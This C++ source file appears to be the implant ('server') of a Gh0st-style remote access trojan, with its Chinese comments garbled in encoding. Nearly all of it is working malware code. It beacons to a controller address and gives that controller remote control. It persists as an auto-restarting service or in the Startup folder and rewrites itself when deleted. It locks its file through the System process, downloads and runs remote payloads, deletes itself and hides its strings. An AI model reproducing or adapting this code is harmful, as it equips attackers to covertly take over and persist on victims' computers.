// Server.cpp : Defines the entry point for the application.
//

// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "common/KernelManager.h"
#include "common/Login.h"

#include  <io.h>
#include <shlobj.h>
#include <STDIO.H>

#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "vfw32.lib")

#include <UrlMon.h>
#import "msxml3.dll"
#pragma comment(lib, "urlmon.lib")

#include <Shlwapi.h>
#pragma comment(lib,"shlwapi.lib")


HMODULE hDllModule = NULL; 
BOOL    bisUnInstall = FALSE;
 

ONLINE_DATA online_data = 
{
	"127.0.0.1",
		8090,
		"",//�������
		"",
		0,
		"",
		"",
		"",
		"",
		"",
		'"',
		'"',
		'"',
		0,
		0,
		0,
		0,
		
};

char NtrLoginAddr[100];    //���ߵ�ַ
DWORD NtrLoginPort;		//���߶˿�
char NtrUpGroup[32];       //���߷���
char NtrVersion[32];		//���߰汾
CHAR NtrServiceName[100];   //��������
CHAR NtrServicePlay[128];   //������ʾ
CHAR NtrServiceDesc[256];   //��������
CHAR NtrFolderName[256];	 //Ŀ¼����
CHAR NtrProcessName[128];   //��������
CHAR NtrInstall;            //��������
CHAR NtrMutex[100];		//���л���
CHAR NtrBuildtime[100];	//����ʱ��
CHAR NtrszDownRun[300];     //�����ַ
BOOL NtrAntideletion;       //��ɾ��
BOOL NtrSelfdeletion;		//��ɾ��


int main(LPVOID p);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	// �����쳣�����´�������
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

//���л��� ������������
BOOL my_CreateEvent(BOOL str)
{
	BOOL strts=NULL;
	
	HANDLE hMutex = CreateEvent(NULL, FALSE, FALSE,NtrMutex);  //���л��� ��������
	if(hMutex != NULL)  //�����ɹ�
	{
		
		if (GetLastError()==ERROR_ALREADY_EXISTS)
		{
			
			Sleep(1000);
			strts = TRUE;
		}
		
		if(str)
		{
			
			CloseHandle(hMutex);  //�ͷ� ����
		}
	}
	else
		strts = TRUE;
	
	return strts;
}


int main(LPVOID p)
{
	if(my_CreateEvent(NULL))  //���л���
	   {
		return 0;  // �˳����г���
	   }
	if (CKernelManager::g_hInstances!=NULL)
	   {
		SetUnhandledExceptionFilter(bad_exception);
	   }
	

    CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
		char	lpszHost[256]={0};
        UINT  	dwPort = 0;
		dwPort = NtrLoginPort;
		lstrcat(lpszHost,NtrLoginAddr);
		
		if(strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}
		
		DWORD dwTickCount = GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}
		
		CKernelManager	manager(&SocketClient,lpszHost,dwPort,TRUE);

		SocketClient.SetManagerCallBack(&manager);
		
		if(SendLoginInfo(&SocketClient,GetTickCount() - dwTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}
		DWORD	dwIOCPEvent;
		do
		{
			dwIOCPEvent = WaitForSingleObject(SocketClient.m_hEvent,100);
			Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);
		
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}
	return 0;
}



DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 1;
}





//�����߳�
DWORD WINAPI ShieldThread()
{
	char   FilePath[MAX_PATH];  
	HANDLE hFile;  
	HANDLE hSearch;  
	void*  Mem;  
	int    Size;  
	DWORD  BytesRead;  
	WIN32_FIND_DATA  FileData;  
	char   ProtectKey1[MAX_PATH*2],ProtectKey2[MAX_PATH*2];  
	__try 
	{ 
		GetModuleFileName(NULL,FilePath,MAX_PATH);  //��ȡ����·��
		//		MessageBox(NULL,FilePath,"",0);
		hFile =CreateFile(FilePath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);  //������
		Size  =GetFileSize(hFile,0);  //��ȡ�����С
		Mem   =VirtualAlloc(0,Size,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);  //���������ڴ�,��СΪ�����С
		ReadFile(hFile,Mem,Size,&BytesRead,0); //��ȡ�����CODE
		CloseHandle(hFile); //�رվ��
		while(1)  
		{  
			hSearch =FindFirstFile(FilePath,&FileData);  
			if(hSearch==INVALID_HANDLE_VALUE)  //�����������,˵������ɾ��ɱ��
			{  
				hFile=CreateFile(FilePath,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);  //�����ļ����
				WriteFile(hFile,Mem,Size,&BytesRead,0);  //д��ղŻ�ȡ���������Code
				CloseHandle(hFile);  //�رվ��
				
				//��ɸ���
			}  
			FindClose(hSearch);  
			Sleep(15000);  //�������15��
		}  
	}  
	__finally  
	{  
		
		CloseHandle(hFile);  
		FindClose(hSearch);  
	}  
	return TRUE; 
} 


////////////////////////////��������
//�����ļ���
void MyCreatDirector(LPSTR Path) 
{
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	for (i=0;(size_t)i<strlen(Path);i++)
	{
		if(Path[i]=='\\')
		{
			
			strncpy(Dir,Path,i);
			
			if(_access(Dir,NULL)==-1)
			{
				
				CreateDirectory(Dir,NULL);
				
			}
		}
	}
	
}


#include <SHELLAPI.H>
int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
	
}

HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;
	
	HINSTANCE userenv = LoadLibrary("userenv.dll"); 
	typedef DWORD (WINAPI *CEB)(LPVOID *lpEnvironment,HANDLE hToken,BOOL bInherit);
	CEB  myCreateEnvironmentBlock= (CEB  )GetProcAddress(userenv,"CreateEnvironmentBlock");
	
	
	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	
	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";
	
	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken,  0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	typedef DWORD (WINAPI *TWTSGetActiveConsoleSessionId)(void);
	
	TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
	MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId  )GetProcAddress(LoadLibrary("Kernel32.dll"),"WTSGetActiveConsoleSessionId");
	
	if ( MyWTSGetActiveConsoleSessionId )
	{
		TokenInformation = MyWTSGetActiveConsoleSessionId();
		
		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//WTSQueryUserToken(TokenInformation,&hObject);
		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}
	
	if(userenv)
		FreeLibrary(userenv);
	
	return result;
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
    hServiceStatus = RegisterServiceCtrlHandler(NtrServiceName, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
	OSVERSIONINFO OSversion;	
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

	if (NtrAntideletion)
			CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//�����߳�

	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
    {
        if (OSversion.dwMajorVersion < 6)
		{
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread(), (LPVOID)NtrServiceName, 0, NULL);
			do
			{
				Sleep(100);
				
			}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
		else
		{
			TCHAR MyName[MAX_PATH];
			HANDLE hActiveSession;
			DWORD ExitCode = 0; 
			GetModuleFileName(NULL,MyName,sizeof(MyName));//��ȡ��ǰ�ļ�·��
			char CommandLine[1024];
			wsprintfA(CommandLine,"%s Win7",MyName);
			
			hActiveSession = RunInActiveSession(CommandLine);
			CloseHandle(hActiveSession);
			
			
		}
    }
	do
	{
		Sleep(100);
	}while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED && bisUnInstall == FALSE);
	//���ﲻ�ӻ�һֱ���г���
}

//��װ����
BOOL NtInstallService(LPCTSTR strServiceName, //��������
					  LPCTSTR strDisplayName, //������ʾ����
					  LPCTSTR strDescription, //��������
					  LPCTSTR strPathName,    //��ִ���ļ���·��
					  LPCTSTR Dependencies,   //ָ�������÷���ǰ�����������ķ���������,һ��ΪNULL
					  BOOLEAN KernelDriver,   //�Ƿ�װ��������
					  ULONG   StartType       //��������
					  )
{
    BOOL bRet = FALSE;
    SC_HANDLE svc=NULL, scm=NULL;
    __try
    {
        scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
		{
            return -1;
        }
		svc = CreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);
		
		
		
		SERVICE_FAILURE_ACTIONS sdBuf={0};
		ChangeServiceConfig2(svc, SERVICE_CONFIG_DESCRIPTION, &sdBuf);
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=NULL;
		
		SC_ACTION action[3];
		action[0].Delay=5000;
		action[0].Type=SC_ACTION_RESTART;
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		ChangeServiceConfig2(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf);
		
		// 		SERVICE_DESCRIPTION Service_Descrip={&strDisplayName};
		ChangeServiceConfig2(svc,SERVICE_CONFIG_DESCRIPTION,&sdBuf);
		
		if (svc == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = OpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    StartService(svc,0, 0);
            }
        }
		if (!StartService(svc,0, 0))
            __leave;
		
		char str[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
        TCHAR Desc[MAX_PATH];
        wsprintfA(Desc,str, strServiceName);
		
		WriteRegEx(HKEY_LOCAL_MACHINE, 
			Desc, 
			"Description", 
			REG_SZ, 
			(char*)strDescription, 
			lstrlen(strDescription), 
			0);			
		
        bRet = TRUE;
    }
    __finally
    {
        if (svc!=NULL)
            CloseServiceHandle(svc);
        if (scm!=NULL)
            CloseServiceHandle(scm);
    }
	
    return bRet;
}

/****************************************ռ�ӷ�ɾ��*************************************************/
void RaiseToDebugP()  //��Ȩ����  
{  
    HANDLE hToken;  	
    HANDLE hProcess = GetCurrentProcess();  	
    if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )  
	{  	
        TOKEN_PRIVILEGES tkp;  
		
		char QNdJE01[] = {'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e','\0'};
		if (LookupPrivilegeValue(NULL, QNdJE01, &tkp.Privileges[0].Luid) )
		{  
            tkp.PrivilegeCount = 1;  
			
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
			
			BOOL bREt = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) ;  
			
		}  
        CloseHandle(hToken);  	
	}      
	
}  

BOOL OccupyFile( LPCTSTR lpFileName )  
{
	BOOL    bRet;  
	//��������Ȩ��  
	
	RaiseToDebugP();  
	//��һ��pidΪ4�Ľ��̣�ֻҪ�Ǵ��ڵĽ��̣������� 
	
	HANDLE hProcess = OpenProcess( PROCESS_DUP_HANDLE, FALSE, 4);    // 4Ϊsystem���̺�  
	
	if ( hProcess == NULL )  
	{            
		return FALSE;  
	}  
	
	HANDLE hFile;  
	HANDLE hTargetHandle;  
	//�Զ�ռģʽ��Ŀ���ļ�  
	hFile = CreateFile( lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);   
	if ( hFile == INVALID_HANDLE_VALUE )  
	{  
		CloseHandle( hProcess );  
		return FALSE;  
	}  
	
	//���ļ�������Ƶ�pid=4�Ľ�����ȥ��������ֻҪpid=4�Ľ��̲��˳���˭Ҳ������Ŀ���ļ�  
	
	bRet = DuplicateHandle( GetCurrentProcess(), hFile, hProcess, &hTargetHandle,   
		0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);  
	
	CloseHandle( hProcess );  
	
	
	return bRet;  
}  

///////////////////////////////////////////////////////
bool FileDownRun(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
}


DWORD WINAPI DownRun(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	char szFile[512] = {0};
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
			return false; //�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ
    }else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
		return false;    //URL ����ȷ���ļ�����ʧ��	
	else
		return false; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
	
	FileDownRun(szFile,SW_SHOW);
	
	return true;
}

// дע��� ���� ��ע ��װʱ�� ��Ϣ
void SetRegInfo()
{
	char strSubKey[MAX_PATH];
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);
	//����
	WriteRegEx(HKEY_LOCAL_MACHINE,strSubKey,"Group", REG_SZ,NtrUpGroup, strlen(NtrUpGroup),0);

}

//ж�س���
extern HMODULE hDllModule;
void MysDeleteSel()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];
	
	GetModuleFileName(hDllModule,strServiceDll,sizeof(strServiceDll));
	GetSystemDirectory(strRandomFile, sizeof(strRandomFile));
	wsprintfA(strRandomFile, "%s\\%d.bak",strRandomFile, GetTickCount());
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}


extern "C" __declspec(dllexport) LPVOID Shellex(ONLINE_DATA m_Install)
{	

	int nInStallSizeof=sizeof(ONLINE_DATA)+1;
	ONLINE_DATA *pNewInStall=(ONLINE_DATA *)new  char[nInStallSizeof];
	memcpy(pNewInStall,&m_Install,nInStallSizeof);
	lstrcpy(NtrLoginAddr,pNewInStall->LoginAddr);
	NtrLoginPort=pNewInStall->LoginPort;
	lstrcpy(NtrUpGroup,pNewInStall->UpGroup);
	lstrcpy(NtrVersion,pNewInStall->Version);	
	lstrcpy(NtrServiceName,pNewInStall->ServiceName);
	lstrcpy(NtrServicePlay,pNewInStall->ServicePlay);
	lstrcpy(NtrServiceDesc,pNewInStall->ServiceDesc);	

	lstrcpy(NtrFolderName,pNewInStall->FolderName);
	lstrcpy(NtrProcessName,pNewInStall->ProcessName);
	NtrInstall=pNewInStall->Install;
	lstrcpy(NtrMutex,pNewInStall->Mutex);
	lstrcpy(NtrBuildtime,pNewInStall->Buildtime);
	lstrcpy(NtrszDownRun,pNewInStall->szDownRun);	
	NtrAntideletion=pNewInStall->Antideletion;
	NtrSelfdeletion=pNewInStall->Selfdeletion;

	delete[] pNewInStall;
	
	OutputDebugString("�������Shellex");
	
	WNDCLASS m_WndClass;
	ZeroMemory(&m_WndClass,sizeof(WNDCLASS));
	
	//ˮƽ�϶�
	m_WndClass.style=CS_HREDRAW;
	
	//�ص�������ַ
	m_WndClass.lpfnWndProc=NULL;
	
	//��������  ����ΪNULL
	m_WndClass.cbClsExtra = NULL;
	
	//��������  ����ΪNULL
	m_WndClass.cbWndExtra = NULL;
	
	//����ʵ��
	m_WndClass.hInstance  = NULL;
	
	//����Icon
	m_WndClass.hIcon = LoadIcon(NULL,IDI_INFORMATION);
	
	//������
	m_WndClass.hCursor = LoadCursor(NULL,IDC_HELP);
	
	//������ɫ
	m_WndClass.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
	
	//��������
	m_WndClass.lpszClassName = NULL;
	
	//ע������
	RegisterClass(&m_WndClass);
	
	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// ����������ʱ��С©��������ʧ
	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);

	//��������
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 
	
	GetModuleFileName(GetModuleHandle(0),strInstallModule,sizeof(strInstallModule));
	

	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, strInstallModule);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return 0;
	}



	if (NtrszDownRun != NULL)
	{
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DownRun,
			(LPVOID)NtrszDownRun, 0, NULL, true);
	}

	SetRegInfo();

	if(NtrInstall)//���������ɫ��װ
	{
		if (NtrInstall == 2)
		{
			Installope= 1;//��������
			SERVICE_TABLE_ENTRY serviceTable[] = { {NtrServiceName,(LPSERVICE_MAIN_FUNCTION) ServiceMain}, {NULL,NULL} };//����Ѿ�����ֱ����������
			
			if (!StartServiceCtrlDispatcher(serviceTable))
			{	
				char MgzBp[MAX_PATH];
				char szPath[MAX_PATH];//���������ļ������ַ���
				LPSTR pszReleaseFilePath=new char[MAX_PATH];
				SHGetSpecialFolderPath(NULL,pszReleaseFilePath,CSIDL_PROGRAM_FILES,FALSE);
				lstrcat(pszReleaseFilePath,"\\");
				lstrcat(pszReleaseFilePath,NtrFolderName);

				strcpy(NtrFolderName,pszReleaseFilePath);

				if(NtrFolderName[strlen(NtrFolderName)-1]=='\\') //ȥ������'\\'
					NtrFolderName[strlen(NtrFolderName)-1]=0;

				char DQeBW01[] = {'%','s','\\','%','s','\0'};
				sprintf(MgzBp,DQeBW01,NtrFolderName,NtrProcessName);   //���Ӱ�װĿ¼�ͳ�������
				char * toPath = MgzBp;        //Ҫ���Ƶ���·���ַ���

				MyCreatDirector(MgzBp);	//�ļ��в����ڴ����ļ���
				GetModuleFileNameA(NULL,(LPCH)szPath,225);     //��ȡ����·���ĺ���	
				CopyFileA(szPath,toPath,false);       //���ƺ�������szPath���Ƶ�toPath��ǿ�и���ԭ���ļ�
	
				BOOL szBool = NtInstallService(NtrServiceName,NtrServicePlay,NtrServiceDesc,toPath,NULL,false,SERVICE_AUTO_START);//��װ����

				if (NtrAntideletion)
				{
					OccupyFile(toPath); //ռ�Ӱ�װ
				}	
				if (!szBool)//��װʧ��ֱ������
				{
					MainThread();		
				}
				else if (NtrSelfdeletion)
				{
					SetFileAttributes(toPath, FILE_ATTRIBUTE_HIDDEN);  // �����ļ�����
					SetRegInfo(); //дע�����Ϣ
					MysDeleteSel();
		}
			}
		}
		if (NtrInstall == 1)
		{
			Installope= 2;//д������
			TCHAR   szPath[MAX_PATH];
			TCHAR	MyPath[MAX_PATH];
			if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
			{
				return FALSE;
			}

			GetModuleFileName(NULL,MyPath,MAX_PATH);//��ȡ��ǰĿ¼
			PathRemoveFileSpec(MyPath);//ȥ���ļ���
			if (strcmp(MyPath,szPath) == 0)  //�����ǰĿ¼��������Ŀ¼ֱ������
			{
				if (NtrAntideletion)
				{
					CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//�����߳�
				}
				MainThread(); //����
				return 0;
			}

			char FileName[80];
			wsprintf(FileName,"%s.exe",NtrProcessName);
			TCHAR buf[MAX_PATH], buf2[MAX_PATH];
			wsprintf(buf, "%s\\%s", szPath, FileName);
			if (GetFileAttributes(buf) == -1)
			{
				wsprintf(buf2, "\\??\\%s\\%s", szPath, FileName);
				DefineDosDevice(1, "agmkis2", buf2);
				Sleep(100);
				char strInstallModule[MAX_PATH];
				GetModuleFileNameA(NULL,(LPCH)strInstallModule,225);     //��ȡ����·���ĺ���
				CopyFile(strInstallModule,"\\\\.\\agmkis2",FALSE);//���������ļ�
				MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				CreateDirectory(szPath, NULL); //����Ŀ¼
				if (NtrSelfdeletion) //�ǲ�����ɾ��
				{
					ShellExecute(NULL,"open",buf,NULL,NULL,SW_HIDE);
					MysDeleteSel();
					return 0;
				}else if (NtrAntideletion)
				{
					CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//�����߳�
					OccupyFile(buf);
			}
			}
			MainThread(); //�����װʧ��ֱ������
			return 0;
		}	
	}
	else
	{	
		Installope= 0;//��ɫ����
		HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		if (NtrAntideletion)	
			CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//�����߳�
		return 0;	
	}
	return 0;
}



